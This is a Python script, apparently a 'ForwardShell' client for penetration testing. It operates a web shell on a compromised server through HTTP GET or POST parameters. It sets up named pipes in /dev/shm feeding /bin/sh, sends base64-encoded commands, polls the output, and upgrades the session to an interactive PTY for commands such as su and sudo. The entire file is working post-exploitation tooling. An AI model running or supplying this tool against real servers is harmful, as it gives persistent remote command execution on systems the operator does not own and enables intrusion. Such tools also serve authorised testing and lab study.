#!/usr/bin/python3
# -*- coding: utf-8 -*-

import base64
import random
import requests
import threading
import time
import argparse
import sys
import os

class WebShell(object):
    """
    WebShell client that simulates a semi-interactive shell via HTTP requests.
    It uses named pipes (mkfifo) on the target to maintain state.
    """

    def __init__(self, url, method="GET", param="cmd", interval=1.3, no_python=False):
        """
        Initialize the WebShell session.
        
        :param url: The URL of the target webshell.
        :param method: HTTP method to use (GET or POST).
        :param param: The parameter name expected by the webshell (e.g., 'cmd' or 'c').
        :param interval: Polling interval for the read thread.
        :param no_python: If True, avoids using Python on the target for PTY upgrade.
        """
        self.url = url
        self.method = method.upper()
        self.param = param
        self.interval = interval
        self.proxies = {"http": None, "https": None}
        self.is_upgraded = False 
        self.no_python = no_python
        
        session = random.randrange(10000, 99999)
        print(f"[*] Session ID: {session}")
        print(f"[*] Target: {self.url}")
        
        # Define paths for named pipes in shared memory (usually writable)
        self.stdin = f'/dev/shm/input.{session}'
        self.stdout = f'/dev/shm/output.{session}'

        print("[*] Setting up fifo shell on target...")
        # create named pipe and redirect input/output
        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        self.RunRawCmd(MakeNamedPipes, timeout=0.1)

        print("[*] Setting up read thread...")
        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()

    def ReadThread(self):
        """
        Background thread that continuously polls the output file on the target
        and displays the content to the local user.
        """
        GetOutput = f"/bin/cat {self.stdout}"
        while True:
            result = self.RunRawCmd(GetOutput)
            if result:
                try:
                    # Parse output assuming the webshell wraps result in <pre> tags
                    start = result.find("<pre>") + 5 
                    end = result.find("</pre>")
                    if start > 4 and end > 0:
                        clean_output = result[start:end].rstrip('\n')
                        
                        if clean_output:
                            if self.is_upgraded:
                                # In PTY mode, print raw output to handle control characters
                                sys.stdout.write(clean_output)
                            else:
                                # In raw mode, ensure newlines for readability
                                sys.stdout.write(clean_output + "\n")
                                
                            sys.stdout.flush()

                            # Clear the remote output file to avoid reading duplicates
                            ClearOutput = f'echo -n "" > {self.stdout}'
                            self.RunRawCmd(ClearOutput)
                except Exception:
                    pass
            time.sleep(self.interval)

    def RunRawCmd(self, cmd, timeout=50):
        """
        Execute a single command on the remote server via HTTP.
        """
        payload = {self.param: cmd}
        try:
            if self.method == "POST":
                r = requests.post(self.url, data=payload, proxies=self.proxies, timeout=timeout)
            else:
                r = requests.get(self.url, params=payload, proxies=self.proxies, timeout=timeout)
            return r.text
        except requests.exceptions.ReadTimeout:
            pass
        except Exception as e:
            print(f"[!] Connection Error: {e}")
            pass

    def WriteCmd(self, cmd):
        """
        Encodes the user command in Base64 and writes it to the remote input pipe.
        """
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo {b64cmd} | base64 -d > {self.stdin}'
        self.RunRawCmd(stage_cmd)
        # Slight delay to allow the command to be processed
        time.sleep(self.interval * 1.1)

    def UpgradeShell(self):
        """
        Upgrades the standard shell to a PTY (Pseudo-Terminal).
        This enables interactive commands like 'su', 'sudo', etc.
        """
        self.is_upgraded = True
        print("[*] Upgrading to PTY...")
        
        if self.no_python:
            print("[*] Mode --no-python: Forcing usage of 'script' command")
            UpgradeCmd = "script -qc /bin/bash /dev/null"
        else:
            # Try Python3, then Python, then fallback to script
            UpgradeCmd = """python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null"""
        
        self.WriteCmd(UpgradeCmd)
        
        # We only keep stty -echo to prevent double characters, 
        # as the other configuration lines were removed per request.
        self.WriteCmd("stty -echo")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help="Target URL")
    parser.add_argument('-m', '--method', default='GET', help="HTTP Method (GET/POST)")
    parser.add_argument('-p', '--param', default='cmd', help="Parameter name")
    parser.add_argument('--upgrade', action='store_true', help="Auto-upgrade to PTY on startup") 
    parser.add_argument('--no-python', action='store_true', help="Do not use Python for PTY upgrade")
    parser.add_argument('-r', '--readline', action='store_true', help="Enable readline (history and arrow keys) [Warning: Laggy]")
    
    args = parser.parse_args()

    # --- Readline Configuration ---
    use_readline = False
    histfile = os.path.join(os.path.expanduser("~"), ".fwd_shell_history")
    
    if args.readline:
        try:
            import readline
            use_readline = True
            try:
                readline.read_history_file(histfile)
                readline.set_history_length(1000)
            except FileNotFoundError:
                pass
            print("[*] Readline enabled.")
        except ImportError:
            print("[!] Error: 'readline' module not found, cannot enable.")
    else:
        # Explicitly informing the user that readline is off (default behavior)
        pass 

    try:
        S = WebShell(args.url, args.method, args.param, no_python=args.no_python)
        
        if args.upgrade:
            S.UpgradeShell()
            prompt = ""
        else:
            prompt = "ForwardShell> "
        
        while True:
            try:
                cmd = input(prompt)
                
                if not cmd.strip(): continue
                
                if cmd.strip() == "upgrade":
                    prompt = "" 
                    S.UpgradeShell()
                elif cmd.strip() == "exit":
                    break
                else:
                    S.WriteCmd(cmd)
            except KeyboardInterrupt:
                print("\n[!] Use 'exit' to quit.")
                
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        # Save history only if readline was enabled
        if use_readline:
            try:
                readline.write_history_file(histfile)
            except Exception:
                pass
